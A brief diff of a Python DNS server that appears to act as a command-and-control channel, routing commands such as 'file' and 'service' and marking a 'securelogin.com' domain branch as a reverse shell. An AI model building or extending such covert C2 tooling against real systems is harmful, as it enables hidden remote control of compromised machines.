@@ -213,7 +213,7 @@ def run(bind_ip=LISTEN_IP, port=53):
                 elif (command == "file"):
                     sendResponseA(sock, data, addr, 85)
                 elif (command == "service"):
-                    sendResponseC(sock, data, addr, 150)
+                    sendResponseA(sock, data, addr, 150)
             else:
                 sendResponseA(sock, data, addr, 100)
         elif (domain == "securelogin.com"): #Reverse Shell
